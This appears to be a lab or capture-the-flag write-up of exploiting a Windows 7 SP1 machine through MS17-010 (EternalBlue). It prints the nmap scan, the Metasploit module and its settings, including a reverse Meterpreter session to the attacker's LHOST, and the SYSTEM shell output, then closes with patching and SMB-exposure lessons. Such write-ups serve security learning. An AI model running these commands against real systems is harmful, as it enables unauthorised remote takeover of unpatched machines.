## Reconnaissance & Enumeration

### Nmap Scan

Started with a comprehensive port scan to identify services:

```bash
nmap -sV -sC -p- 10.129.44.164
```

**Open Ports:**
- **Port 135**: RPC Endpoint Mapper
- **Port 139**: NetBIOS Session Service
- **Port 445**: SMB (Server Message Block)
- **Ports 49152-49157**: RPC Services

**Key Findings:**
- Windows 7 SP1 detected — vulnerable to MS17-010 (EternalBlue)
- SMB is exposed and unpatched
- Standalone workgroup machine with no domain protection

## Exploitation

### Stage 1: Identifying the Vulnerability

The combination of **Windows 7 SP1** + **exposed SMB port 445** immediately indicated vulnerability to **MS17-010 (EternalBlue)** — a critical SMB exploit that allows remote code execution without authentication.

### Stage 2: Searching for Exploit

Used Metasploit to find and prepare the exploit:

```bash
msfconsole
search ms17-010
```

**Exploit Selected:**

exploit/windows/smb/ms17_010_eternalblue


### Stage 3: Configuring and Executing the Exploit

Set up the exploit with target information:

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.129.44.164
set LHOST 10.10.15.193
run
```

**Result:**

[+] Meterpreter session opened
[+] Staging payload
[+] Meterpreter session 1 established


### Stage 4: Obtaining System Access

Launched an interactive shell and verified privileges:

```bash
shell
whoami
```

**Output:**

nt authority\system


**Success!** The exploit delivered **immediate SYSTEM access** — no privilege escalation was needed.

## Summary & Key Takeaways

### Attack Chain

1. **Enumeration** → Identified Windows 7 SP1 with exposed SMB
2. **Vulnerability Assessment** → Recognized MS17-010 (EternalBlue) vulnerability
3. **Exploit Selection** → Used Metasploit's EternalBlue module
4. **Remote Code Execution** → Achieved SYSTEM-level access directly
5. **Flag Retrieval** → Captured both user and root flags

### Key Vulnerabilities

- **Unpatched Windows 7 SP1** — Missing critical SMB security patches
- **Exposed SMB Service** — Port 445 publicly accessible
- **No Authentication Required** — EternalBlue exploits SMB without credentials
- **Direct SYSTEM Access** — No UAC or privilege escalation barriers

### Critical Details

- **MS17-010** (EternalBlue) is the same exploit used in the **WannaCry ransomware attack (2017)** that infected hundreds of thousands of computers worldwide
- **Windows 7 SP1** reached end-of-life in January 2020, making patching critical for security
- The vulnerability allows attackers to execute arbitrary code with kernel-level privileges

### Tools Used

- `nmap` — port scanning and service enumeration
- `msfconsole` — Metasploit framework
- `exploit/windows/smb/ms17_010_eternalblue` — automated exploitation
- `meterpreter` — post-exploitation access

### Lessons Learned

- **Always patch critical systems** — especially Windows 7/Server 2008
- **Monitor SMB exposure** — port 445 should be restricted in production environments
- **Understand exploit history** — WannaCry demonstrated the real-world impact of this vulnerability
- **Defense-in-depth** — even with patches, network segmentation could have limited the damage
- **Legacy systems pose risks** — Windows 7 support ended years ago, yet remains common in penetration tests
